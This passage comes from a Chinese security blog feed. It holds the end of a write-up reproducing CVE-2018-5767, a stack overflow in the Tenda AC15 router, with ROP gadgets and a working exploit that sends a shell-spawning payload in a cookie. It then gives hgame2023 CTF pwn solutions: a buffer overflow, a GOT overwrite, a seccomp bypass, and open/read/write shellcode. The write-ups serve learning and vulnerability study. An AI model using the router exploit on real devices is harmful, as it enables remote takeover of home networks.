class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">fuzz@fuzz-virtual-machine:~/repeat/_US_AC15V1.0BR_V15.03.1.16_multi_TD01.rar.extracted/squashfs-root/bin$ ROPgadget --binary httpd --only <span class="string">&quot;pop&quot;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0000ec88 : pop &#123;fp, pc&#125;</span><br><span class="line">0x000b06bc : pop &#123;r0, pc&#125;</span><br><span class="line">0x000b0e0c : pop &#123;r1, pc&#125;</span><br><span class="line">0x0000e510 : pop &#123;r3, pc&#125;</span><br><span class="line">0x0000e5f0 : pop &#123;r3, r4, fp, pc&#125;</span><br><span class="line">0x0009ffb4 : pop &#123;r3, r4, r5, pc&#125;</span><br><span class="line">0x000a0320 : pop &#123;r3, r4, r5, r6, r7, pc&#125;</span><br><span class="line">0x000a5e30 : pop &#123;r3, r4, r5, r6, r7, r8, sl, pc&#125;</span><br><span class="line">0x0000ec00 : pop &#123;r4, fp, pc&#125;</span><br><span class="line">0x0009fd10 : pop &#123;r4, pc&#125;</span><br><span class="line">0x0000ed80 : pop &#123;r4, r5, fp, pc&#125;</span><br><span class="line">0x000ae530 : pop &#123;r4, r5, pc&#125;</span><br><span class="line">0x000281f4 : pop &#123;r4, r5, r6, fp, pc&#125;</span><br><span class="line">0x0009fde4 : pop &#123;r4, r5, r6, pc&#125;</span><br><span class="line">0x0001bff0 : pop &#123;r4, r5, r6, r7, fp, pc&#125;</span><br><span class="line">0x000a07c4 : pop &#123;r4, r5, r6, r7, pc&#125;</span><br><span class="line">0x0004aec4 : pop &#123;r4, r5, r6, r7, r8, fp, pc&#125;</span><br><span class="line">0x000a002c : pop &#123;r4, r5, r6, r7, r8, pc&#125;</span><br><span class="line">0x0003cfe8 : pop &#123;r4, r5, r6, r7, r8, sb, fp, pc&#125;</span><br><span class="line">0x00090408 : pop &#123;r4, r5, r6, r7, r8, sb, sl, fp, pc&#125;</span><br><span class="line">0x000a1e78 : pop &#123;r4, r5, r6, r7, r8, sb, sl, pc&#125;</span><br><span class="line">0x000a5128 : pop &#123;r4, r5, r6, r7, r8, sl, fp, pc&#125;</span><br><span class="line">0x0009fe44 : pop &#123;r4, r5, r6, r7, r8, sl, pc&#125;</span><br><span class="line">0x0007036c : pop &#123;r4, r6, r7, fp, pc&#125;</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 24</span><br></pre></td></tr></table></figure><p>第一次还看不懂，想着<code>ret</code>在哪里，忽然发现<code>pop pc</code>就是<code>ret</code>。</p><ul><li>计算偏移为<code>448</code>，构造执行<code>puts(&quot;ANZA_HACK&quot;)</code>的<code>rop</code>链发现失败，不难猜测原因是<code>sscanf</code>被<code>\x00</code>截断了(因为用的源程序的<code>gadget</code>，高位为<code>\x00</code>)，故采用<code>libc</code>的<code>gagdet</code>，首先要计算本地<code>libc</code>基址，根据之前在<code>strstr</code>处出错的图可得：</li></ul><p><code>注：与 ctf 中不同的一点是这种 web 服务在崩溃后一般会立刻重启，并且重启之后的 libc 地址和之前是相同的，所以爆破 libc 是比较常用的攻击手段，不过 qemu 没办法提供这种爆破 libc 的条件，我们先假定我们知道 libc 基址。</code></p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/112590/12/35271/139746/63cbdf3cF15f3db66/09273cb75e2df912.png" style="zoom:80%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc_base=<span class="number">0xff613954</span>-<span class="number">24</span>-libc.sym[<span class="string">&quot;strstr&quot;</span>]</span><br></pre></td></tr></table></figure><ul><li>最终<code>exp</code>如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">libc=ELF(<span class="string">&quot;./lib/libc.so.0&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0xff613954</span>-<span class="number">24</span>-libc.sym[<span class="string">&quot;strstr&quot;</span>]</span><br><span class="line">pop_r0_ret=libc_base+<span class="number">0x0003db80</span></span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">sh_addr=<span class="number">0xfffeeca8</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base=&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">payload=<span class="string">&quot;a&quot;</span>*<span class="number">444</span>+<span class="string">&quot;.gif&quot;</span>+p32(pop_r0_ret).decode(<span class="string">&#x27;unicode_escape&#x27;</span>)+p32(sh_addr).decode(<span class="string">&#x27;unicode_escape&#x27;</span>)+p32(system).decode(<span class="string">&#x27;unicode_escape&#x27;</span>)</span><br><span class="line">payload+=<span class="string">&quot;sh\x00\x00&quot;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">URL = <span class="string">&quot;http://192.168.79.152/goform/anza&quot;</span></span><br><span class="line">cookie = &#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;password=&quot;</span>+payload&#125;</span><br><span class="line">requests.get(url=URL, cookies=cookie)</span><br></pre></td></tr></table></figure><ul><li>其他博客的结果都不能<code>getshell</code>。。。。我反而可以<code>getshell</code>，效果如下：</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/222104/25/16882/304730/63cc009fFb1cef77d/1cf45750308aabda.png" style="zoom:80%;" /><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>很有意思的一次实验，接触了很多以前只是听过但是未投入实践的知识，算是入门漏洞挖掘的第一步吧，当然还有很多细节没有盘清楚，未来还需努力。再次感谢博客师傅们。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;考研期间想复现的漏洞，现在挖出来盘一下。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/GDPpK1Pew6bkUZUfazur9Q&quot;&gt;Tenda-AC15栈溢出漏洞(CVE-2018-5767)    by 星期五实验室&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/468018356&quot;&gt;cve-2018-5767 路由器栈溢出漏洞复现    by 合天网安实验室&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://wzt.ac.cn/2019/03/19/CVE-2018-5767/&quot;&gt;CVE-2018-5767 复现分析    by CataLpa&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="cve" scheme="http://example.com/categories/cve/"/>
    
    <category term="cve-2018-5767" scheme="http://example.com/categories/cve/cve-2018-5767/"/>
    
    
    <category term="cve tenda" scheme="http://example.com/tags/cve-tenda/"/>
    
  </entry>
  
  <entry>
    <title>hgame2023</title>
    <link href="http://example.com/2023/01/05/hgame2023/"/>
    <id>http://example.com/2023/01/05/hgame2023/</id>
    <published>2023-01-05T12:06:14.000Z</published>
    <updated>2023-02-01T14:02:32.950Z</updated>
    
    <content type="html"><![CDATA[<p>复健。</p><span id="more"></span><h1 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h1><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="easy-overflow"><a href="#easy-overflow" class="headerlink" title="easy_overflow"></a>easy_overflow</h3><p>确实<code>easy</code>，直接构造栈溢出即可，要注意后门函数地址+1。</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/159776/24/33843/7163/63b6c784F98142c24/0da58b7fb1d9c047.png" style="zoom:80%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/25967/13/20268/3396/63b6c784Fb27b4e3c/ad354f6b6cdab194.png" style="zoom:80%;" /><p><code>exp</code>如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;&quot;</span>,)</span><br><span class="line">backdoor=<span class="number">0x40117b</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(backdoor)*<span class="number">10</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>得到<code>shell</code>后进行一波重定位即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec 1&gt;&amp;2</span><br></pre></td></tr></table></figure><h3 id="choose-the-seat"><a href="#choose-the-seat" class="headerlink" title="choose_the_seat"></a>choose_the_seat</h3><p>典型的负整数越界利用，由未检查下界导致。</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/128060/20/29852/46558/63b6d8d4Faffade79/9f8aae62c7a0994e.png" style="zoom:80%;" /><ul><li>漏洞允许我们更改下标指向<code>0x10</code>内容，且程序可劫持<code>got</code>表。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><ul><li>第一步，劫持<code>exit</code>为<code>vuln</code>函数。</li><li>第二步，泄露任意一处<code>got</code>表地址，即泄露<code>libc</code>。</li><li>第三步，劫持<code>puts</code>为<code>system</code>，顺便写入<code>/bin/sh</code>。</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/59060/18/22803/30759/63b6da2eF20602c20/59d8c4d007e52f4e.png" style="zoom:80%;" /><ul><li><code>exp</code>如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-1.hgame.lwsec.cn&quot;</span>,<span class="number">32413</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line">vul=<span class="number">0x4011DA</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;please choose one.\n&#x27;</span>,<span class="string">b&quot;-6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendafter(<span class="string">&quot;please input your name\n&quot;</span>,p64(vul))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;please choose one.\n&#x27;</span>,<span class="string">b&quot;-8&quot;</span>)</span><br><span class="line">io.sendafter(<span class="string">&quot;please input your name\n&quot;</span>,<span class="string">b&#x27;\xd0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">setbuf=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=setbuf-libc.sym[<span class="string">&quot;setbuf&quot;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc_base==&gt;&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;please choose one.\n&#x27;</span>,<span class="string">b&quot;-9&quot;</span>)</span><br><span class="line">io.sendafter(<span class="string">&quot;please input your name\n&quot;</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(system))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h3><p>蛮有意思的一道<code>orw</code>题，巩固了一些知识点。</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/140425/14/33061/4893/63b83266F5ad1d4fd/c999c86fdd690970.png" style="zoom:80%;" /><p>简单的栈溢出，开了沙箱，禁了<code>system</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0004</span><br><span class="line"> 0002: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0004</span><br><span class="line"> 0003: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0004: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><ul><li>首先泄露<code>libc</code>。</li><li>由于溢出的并不多，因此得想办法<strong>增强溢出能力</strong>。一开始想着走一步返回一步，但溢出的数量仍不足以一次性完成如<code>read(3,bss,0x30)</code>这一系列操作。该题比较巧妙的一点是由于是<code>read</code>造成的溢出，我们其实无需控制<code>rdi</code>和<code>rsi</code>，只需增大<code>rdx</code>，并再次调用<code>read</code>即可。</li><li>ps. 看了下官方<code>wp</code>使用的是<code>栈迁移</code>和<code>mprotect</code>，感觉不如本方法简单。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-1.hgame.lwsec.cn&quot;</span>,<span class="number">31611</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;vuln&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">vul=<span class="number">0x4012C4</span></span><br><span class="line">flag_addr=<span class="number">0x404080</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000401393</span></span><br><span class="line">pop_rsi_r13_ret=<span class="number">0x0000000000401391</span></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">264</span>+p64(pop_rdi_ret)+p64(<span class="number">0x404020</span>)+p64(elf.sym[<span class="string">&quot;puts&quot;</span>])</span><br><span class="line">payload+=p64(vul)</span><br><span class="line">io.send(payload)</span><br><span class="line">libc_base=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">pop_rdx_ret=libc_base+<span class="number">0x0000000000142c92</span></span><br><span class="line">openn=libc_base+<span class="number">0x10DCE0</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">264</span>+p64(pop_rsi_r13_ret)+p64(flag_addr)+p64(<span class="number">0</span>)+p64(elf.sym[<span class="string">&quot;read&quot;</span>])+p64(vul)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.send(<span class="string">b&#x27;/flag&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">299</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">264</span>+p64(pop_rdx_ret)+p64(<span class="number">0x300</span>)+p64(elf.sym[<span class="string">&quot;read&quot;</span>])+p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;b&#x27;</span>*<span class="number">264</span>+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(pop_rdi_ret)+p64(flag_addr)+p64(pop_rsi_r13_ret)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(openn)</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(<span class="number">3</span>)+p64(pop_rsi_r13_ret)+p64(flag_addr)+p64(<span class="number">0</span>)+p64(pop_rdx_ret)+p64(<span class="number">0x40</span>)+p64(elf.sym[<span class="string">&quot;read&quot;</span>])</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(<span class="number">1</span>)+p64(libc_base+<span class="number">0x10E060</span>)+p64(vul)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>还需注意的点是：</p><ol><li><code>open</code>和<code>open64</code>是一个东西，当时<code>libc</code>里找半天，发现<code>open64</code>里有这么一句注释：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Alternative name is &#x27;__open&#x27;</span><br></pre></td></tr></table></figure><ol start="2"><li>使用<code>remote</code>远程端口时，<code>read</code>的<code>rdx</code>参数有多大传多少，否则会导致下面<code>send</code>的数据被之前的<code>read</code>吃掉。</li></ol><h3 id="simple-shellcode"><a href="#simple-shellcode" class="headerlink" title="simple_shellcode"></a>simple_shellcode</h3><p>这种<code>shellcode</code>题目除了掌握基本的<code>orw_shellcode</code>外，要时刻关注执行<code>shellcode</code>前后的寄存器变化，根据寄存器写<code>shellcode</code>。</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/218678/6/25270/21739/63b83fb5Fc42dc228/e207fa91b6c24ab5.png" style="zoom:80%;" /><ul><li>首先<code>shellcode</code>有<code>16</code>个字节大小的限制，这也就意味着接下来我们要用<code>16</code>个字节大小限制的<code>shellcode</code>扩大漏洞利用能力。</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/157748/33/33698/56517/63b8408eFc10e2b83/c51017ea28f05343.png" style="zoom:80%;" /><ul><li>调试并根据寄存器编写一下<code>shellcode</code>，目标是写入更多数据到<code>0xcafe0000</code>这片空间并执行：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">shellcode1=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,rdx</span></span><br><span class="line"><span class="string">    mov edx,0x100</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    call rsi</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode1))</span><br></pre></td></tr></table></figure><ul><li>而后就是编写常规的<code>orw</code>的<code>shellcode</code>，注意开头需要多写一些<code>nop</code>，否则写出的就不是目标<code>flag</code>，猜测是控制相关问题：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">shellcode2=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">    mov rdi,rsp</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    push 2</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    mov edx,0x100</span></span><br><span class="line"><span class="string">    xor eax,eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov edi,1</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>总的<code>exp</code>如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">rom pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-1.hgame.lwsec.cn&quot;</span>,<span class="number">31266</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode2=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">    mov rdi,rsp</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    push 2</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    mov edx,0x100</span></span><br><span class="line"><span class="string">    xor eax,eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov edi,1</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode1=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,rdx</span></span><br><span class="line"><span class="string">    mov edx,0x100</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    call rsi</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode1))</span><br><span class="line">io.send(shellcode1)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.send(shellcode2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="easyasm"><a href="#easyasm" class="headerlink" title="easyasm"></a>easyasm</h3><p>根据汇编找逻辑，分析完发现只是简单的异或：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 